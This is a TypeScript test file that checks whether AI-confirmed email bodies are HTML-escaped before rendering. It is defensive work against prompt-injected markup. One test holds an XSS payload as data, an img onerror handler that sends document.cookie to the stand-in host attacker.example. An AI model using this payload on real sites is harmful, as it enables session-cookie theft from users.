import { readFileSync } from "node:fs";
import { join } from "node:path";
import { escapeHtml } from "../../../email/templates/base";

const CONTROLLER = join(__dirname, "chat-assistant.controller.ts");

describe("AI-confirmed email bodies are escaped before they become HTML", () => {
  it("escapes markup a model can be steered into producing", () => {
    const injected = '<img src=x onerror="fetch(\'https://attacker.example/\'+document.cookie)">';
    const escaped = escapeHtml(injected);

    expect(escaped).not.toMatch(/<[a-z]/i);
    expect(escaped).not.toContain('"');
    expect(escaped).toContain("&lt;img");
  });

  it("no AI email path interpolates an unescaped value into an HTML string", () => {
    const source = readFileSync(CONTROLLER, "utf8");
    const htmlInterpolations = source.match(/<p>\$\{[^}]+\}<\/p>/g) ?? [];

    expect(htmlInterpolations.length).toBeGreaterThan(0);
    for (const fragment of htmlInterpolations)
      expect(fragment).toMatch(/\$\{escapeHtml\(/);
  });
});
